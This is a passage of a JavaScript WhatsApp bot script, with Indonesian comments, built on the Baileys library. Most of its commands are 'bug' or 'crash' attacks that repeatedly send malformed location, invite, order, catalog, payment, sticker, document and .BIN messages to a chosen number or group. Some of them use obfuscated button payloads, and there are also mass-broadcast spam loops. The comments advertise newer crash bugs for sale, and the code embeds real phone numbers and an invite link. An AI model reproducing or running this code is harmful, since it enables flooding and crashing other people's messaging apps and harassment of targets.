27h2I/KqIpPs1Pl/kI2moRzIJI23KfBGCKNW59XAUZJ7AUHsNN2mNBlgiFM+DznJ9zmm/pywVrtEfxStK9Dq/QVqEE0MaqEOWOKSNTvr/wDqjDG8scRbaqxHlsHBzjuc+K3/AFPQ4ZYGQqM44OKSZtCu4bwtG+4E+VGRRi0nskouSq6KnT/SeqMbVoL/ANItGrusy7treQCOa0DW7JoujdRt52DH+kk3NjuQpP8AFQaDavaoGlbkdhV3qGb19Du4u++Mpj/tx/NRtOWg1URJ+z1DFpUbt97G0j25/wB/WnZ2zge7ClnQIBbRPGo2qrYA8dhTBuy6/U1rj0c6W2Xn4dgP7vNIl1pK3t9qceCHcrPC3sy5A/gfWtLubVDDJIq7WVS3yNIt7qVjp15A00qs7owKp8TZ74+XejKq2LjbbuIoE4xuUqfKkYIPtUsVss5GMmutVvIr6+kuYUaNXIJVjk58n61xaXBjbFYpaejpw2rLbwpawkgAY5q707cYvix+EYyM+RVG+nElq2CMmhJv7lLmIKFWJV2k5Ib6eKAapm1llvLYCNhuI7ml8XCi5ZJVCupwQaSbPV9Vu7qGO0vHiCsA2VByPn7CmHUZvSkWVpN0h+83bJqBpIZUnh28KBQHqvV4NN0xJpg5RplXCDJ7E9vpVaLUcqMN3pf6yuf6mK2td2fiMjD28D+akXuyTj/LCehdQ6Tcq6x30SyMxISRtrEceDTMjhmyDkbeDWLPpCSxrgbiRk5FSQNquj82Oo3ELfgRtyn6HitMcq9MTwvtG09a9QPFozQWMbCOYmMz+O3IHzrJLm5jEMRLZdQGAXv25rZtU02PWelZrGMbSY90ZXjDDkf786xWysXmlMWwqVJViR93B80mVNyQMHFRf4T2LT3bM5CxxL3Hck1cTvXqVBaosEZC7clSf7h7H5/xVUTurAhePIPmq5RpF0MtP8Lc7FYicE45oLcXjB9oRx8yOKLC4juAY8lZAM7W4OPce4/KuPSQHlQfzFL0XKSbs503VLtQEs7RWkbIckY/KrUp1QSK14Aqk/dHirulxW0cocuwc+BwKNGyl1K4jtoV3yOcAAcAe5+VRbHnKPaVAaK6EMe4ngUFuJHvbhp3bhuF/Ktgk6EsJdBOmhCtw2HN2y4Yt7Y8L4xWUXNhNbXsltOm14WKOvgEHFNKDj2UxyrJqPhEAANkY/M+K9D0o3+I7mPnFdSOqDaoGaqbyWOOT+KgFmwdM6tHcaRHOXAQLuJJ7ACka8eBtWunhj9OKdzKvPPz/wDfrXOmR3GnWElgs7Pbs2VyMNj8J+teXNtI4wgyyncPzrTJuqZhSVtorvAk4IIxk/pXEdksTfGufZsUQgtpDGH2HB/arMcRwQRz86Sh0wVNp1tfLtk+8v3WU4ZT8jUTaffWq59NbmP3HDAfzTAIlByRwfNTRpxyc4pXGx4za6ANhbpcTBPSeNvwk8/pWodL2SWNiriMJM7Esx+8R4BP8UB06Met6hxkcZprsQzDI4jA4Pzp8cKdiZsrlHiEpztIYnIPNZN9o9utv1CtwpCi4gWR/wDsCVP64Fafcy5QckkVl32k75NZssn4f6YY+XxNRy9C/O3yElmaRuMgVLHHkH2Hc11HCWPHC+9ShVJ2g4UcVmbN8Y+n/9k=\nX-WA-BIZ-DESCRIPTION:Developer © banghwWhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:banghw\nEND:VCARD",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
}
break
//=================================================//
case 'lokas': case 'banghwlokas': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© banghw${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
}
break
//=================================================//
case 'buglokas': case 'banghwlokas2': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© banghw${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
}
break
//=================================================//
case 'buginvite': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME banghw${ngazap(prefix)}`,
"groupName": `MY NAME banghw${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
}
break
//=================================================//
case 'banghwtroli': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© banghw${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
"orderTitle": `© banghw${ngazap(prefix)}`,
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break
//=================================================//
case 'catalog': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `© banghw${ngazap(prefix)}`,
"description": `© banghw`,
"currencyCode": "IDR",
"footerText": `© banghw`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© banghwWE ARE NOT MASTOD`,
"url": "wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break
//=================================================//
case 'catalogpc': case 'cataloggc':  {
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `© banghw${ngazap(prefix)}`,
"description": `© banghw`,
"currencyCode": "IDR",
"footerText": `© banghw`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `© banghwWE ARE NOT MASTOD`,
"url": "wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc})
haikal.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
m.reply(tekteka)
}
break
//=================================================//
case 'banghwjagoan' : {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © banghw`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:doc})
}
}
break
case 'mainpayment1' : case 'mainpayment2': case 'mainpayment3': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © banghw`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted: m})
}
}
break
//=================================================//
/*BUG WACAP */
case 'banghwskuy' : {
if (isBan) throw sticBanLu(from)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
}
break
//=================================================//
/*BUG WACAP */
case 'gasbanghw' : {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(10000)
}
break
//=================================================//
//CUMAN WORKS DI BAILEYS TERTENTU KALAU MAU GUNAKAN 
//BUG BARU INI KALIAN BISA ORDER KE GUA YA GUYS YAH
case '🔥': case 'mausantet': case 'diasantet': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
mm = text.split("|")[0]+'@s.whatsapp.net'
jumlah = text.split("|")[1]
let secon = text.split("|")[2]
a = await reply(`Succes send bug "CRASH🐼" Ke ${mm} Sebanyak ${jumlah} kali dalam waktu ${secon} detik`)
for (let i = 0; i < jumlah ; i++){
function _0x128b(_0x4b9866,_0x371baa){var _0x50e42b=_0x50e4();return _0x128b=function(_0x128b07,_0x1424a2){_0x128b07=_0x128b07-0xc4;var _0x46e270=_0x50e42b[_0x128b07];return _0x46e270;},_0x128b(_0x4b9866,_0x371baa);}function _0x50e4(){var _0x19e1ed=['AH\x20SLEBEEW','1GwlWkW','GROUP\x20HW\x20MODS\x20WA','Anjay\x20Menger','27130YhLdkr','JAGOAN\x20OM?','HW\x20MODS\x20WA','2064696gWphjy','4LwmPfv','2167585ExfAxr','NAME','6281214281312','8702696DrukdN','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','6017EGBulL','1073458pGrfkv','6dptURc','6285714170944','10304770yoKCaH','16102656Vbpaag','OWNER'];_0x50e4=function(){return _0x19e1ed;};return _0x50e4();}var _0x1cddf0=_0x128b;(function(_0x34c939,_0x276d78){var _0x100957=_0x128b,_0x2bb075=_0x34c939();while(!![]){try{var _0x487c43=-parseInt(_0x100957(0xd7))/0x1*(-parseInt(_0x100957(0xd0))/0x2)+parseInt(_0x100957(0xc8))/0x3*(parseInt(_0x100957(0xc9))/0x4)+parseInt(_0x100957(0xca))/0x5*(parseInt(_0x100957(0xd1))/0x6)+-parseInt(_0x100957(0xd3))/0x7+parseInt(_0x100957(0xcd))/0x8+-parseInt(_0x100957(0xd4))/0x9+-parseInt(_0x100957(0xc5))/0xa*(-parseInt(_0x100957(0xcf))/0xb);if(_0x487c43===_0x276d78)break;else _0x2bb075['push'](_0x2bb075['shift']());}catch(_0x382e1c){_0x2bb075['push'](_0x2bb075['shift']());}}}(_0x50e4,0xec948),await haikal['sendMessage'](mm,{'text':'','templateButtons':[{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xd2)}},{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xcc)}},{'urlButton':{'displayText':_0x1cddf0(0xd8),'url':_0x1cddf0(0xce)}},{'quickReplyButton':{'displayText':'MY','id':_0x1cddf0(0xc4)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xcb),'id':_0x1cddf0(0xd6)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xc7),'id':_0x1cddf0(0xc6)}}]}));
  await sleep(10000* secon)
}
}
break
case '🌷': case 'crashmek': case 'ampunsuhu': case 'ahyangbetul': case 'okemek': case 'banghwnih': case 'crashar18': case 'mexdemam': case 'banghw1': case 'banghw2': case 'banghw3': case 'banghw4': case 'banghw5': case 'banghw6': case 'banghw7': case 'banghw8': case 'banghw9': case 'banghw10': case 'banghw11': case 'banghw12': case 'banghw13': case 'banghw14': case 'banghw15': case 'banghw16': case 'banghw17': case 'banghw18': case 'banghw19': case 'banghw20': case 'banghw21': case 'banghw22': case 'banghw23': case 'banghw24': case 'banghw25': case 'banghw26': case 'banghw27': case 'banghw28':
case 'banghw29':
case 'banghw30':
case 'banghw31':
case 'banghw32':
case 'banghw33':
case 'banghw34':
case 'banghw35':
case 'banghw36':
case 'banghw37':
case 'banghw38':
case 'banghw39':
case 'banghw40':
case 'banghw41':
case 'banghw42':
case 'banghw43':
case 'banghw44':
case 'banghw45':
case 'banghw46':
case 'banghw47':
case 'banghw48':
case 'banghw49':
case 'banghw50':
case 'banghw51':
case 'banghw52':
case 'banghw53':
case 'banghw54':
case 'banghw55':
case 'banghw56':
case 'banghw57':
case 'banghw58':
case 'banghw59':
case 'banghw60':
case '👽': case '️👾': case '🪐': case '🦴': case '☝': case '🏻': case '🦖': case '🦕': case '👿': case '🐉': case '⚡': case '💥': case '🌪️': case '🍂': case '🍃': case '🌴': case '🌿': case '🍀': case '🪵': case '🦥': case '🌳': case '🍁': case '🎋': 
case '🦂':
case '🐍':
case '🍓':
case '🍒': 
case '🍎': 
case '🍉': 
case '🍑': 
case '🍊':
case '🥭':
case '🍍': 
case '🍌':
case '🍋':
case '🍈':
case '🍏':
case '🍐':
case '🥝':
case '🫒':
case '🫐':
case '🍇':
case '🥥':
case '🍅':
case '🌶️':
case '🥕':
case '🍠':
case '🧅':
case '🌽':
case '🥦':
case '🥒':
case '🥬':
case '🫑':
case '🥑':
case '🍆':
case '🧄':
case '🥔':
case '🌰':
case '🥜':{
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','6281214281312','771192XPifQJ','6285714170944','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','reply\x20Menger','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20HW\x20MODS\x20WA','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'HW\x20MODS\x20WA','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case 'afk': {
if (isBan) throw sticBanLu(from)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${m.pushName} Hello Saya Bot Hw Mods${text ? ': ' + text : ''}`)
}
break
//=================================================//
case 'banghwstik': case 'banghwkangbug': case 'buttonkematian': case 'crashar19': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, {sticker: thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"height": 1288,
"width": 1288,
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false,
}
}
}})
}
deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//=================================================//
case 'tiktok': case 'tiktoknowm': case 'bugtiktok':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Link Nya Kak`)
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return m.reply(`Contoh ${prefix+command} https://vm.tiktok.com/ZSdQycjUx/?k=1`)
let dede = await cl.downloader.tiktok(`${q}`)
krt = await getBuffer(dede.nowm)
m.reply(mess.wait)
haikal.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `${bugsw}` }, { quoted:m })
break
//=================================================//
case 'banghwbugie': case 'banghwkangbug1': case 'crashar20': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `© banghw${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
}
}
}})
}
deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//=================================================//
case 'bugbcimage': case 'bugbcvideo': case 'bugbcaudio': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (!/video/.test(mime) && !/image/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`
let anu = await store.chats.all().map(v => v.id)
let doc ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fs.readFileSync('./baseikal/image/pict.jpg'), surface: 200, message: `ZIM-BOT-INC`, orderTitle: '© banghw', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
m.reply(`*Send Broadcast To* ${anu.length} *Group Chat, Time ${anu.length * 1.5} minutes*`)
for (let i of anu) {
await sleep(1500)
let butoon = [{
urlButton: {
displayText: `GITHUB`,
url: 'https://youtube.com/c/HwModsWa857'
}
},
{
quickReplyButton: {
displayText: 'MENU',
id: 'menu'
}
}]
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
if (/webp/.test(mime)) {
haikal.sendMessage(i, { sticker: { url: media } }, { quoted: doc })
} else if (/image/.test(mime)) {
let junn = `*_BROADCAST IMAGE_*${text ? '\n\n' + text : ''}`
haikal.send5ButImg(i, junn, `${global.botname}`, buffer, butoon)
} else if (/video/.test(mime)) {
let junn = `*_BROADCAST VIDIO_*${text ? '\n\n' + text : ''}`
haikal.sendMessage(i, {video: buffer, caption: `${junn}`}, { quoted: doc })
} else if (/audio/.test(mime)) {
haikal.sendMessage(i, {audio: buffer, mimetype: 'audio/mpeg'}, { quoted : doc })
} else {
m.reply(`*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`)
}
await fs.unlinkSync(media)
}
m.reply(` *Send Broadcast To* ${anu.length} *Chats*`)
}
break
//=================================================//
case 'bugbctext': {
if (isBan) throw sticBanLu(from)
if (!text) throw `*Type some text*\n\nExample : ${prefix + command} banghwmods`
let doc = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© ${botname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${haikal.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await getBuffer(picak+'Brodcast'), thumbnail: await getBuffer(picak+'Brodcast'),sendEphemeral: true}}}
let anu = await store.chats.all().map(v => v.id)
m.reply(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
for (let yoi of anu) {
await sleep(1500)
haikal.sendMessage(yoi, {text:`${text}`}, {quoted:doc})
}
m.reply('*Success Broadcast*')
}
break
//=================================================//
case 'banghwbutton': case 'banghwkangbuttton': case 'testbutton': case 'inibutton': 
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
const buttons = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonMessage = {
text: "banghw",
footerText: 'Pe',
buttons: buttons,
headerType: 1
}
haikal.sendMessage(m.chat, buttonMessage)
}
 break
//=================================================//
case 'banghwtag': case 'banghwbar':  {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
haikal.sendMessage(m.chat, { text : `${buttonkal}` , mentions: participants.map(a => a.id)}, { quoted: doc })
}
break
//=================================================//
case 'hiya': case 'banghwoke': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
anuin = fs.readFileSync('./baseikal/sound/ngeselin.BIN')
haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `banghw${ngazap(prefix)}.BIN`, title: `banghw${ngazap(prefix)}.BIN` }, { quoted: doc })
}
}
break
//=================================================//
case 'banghwtod': case 'banghwewe': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
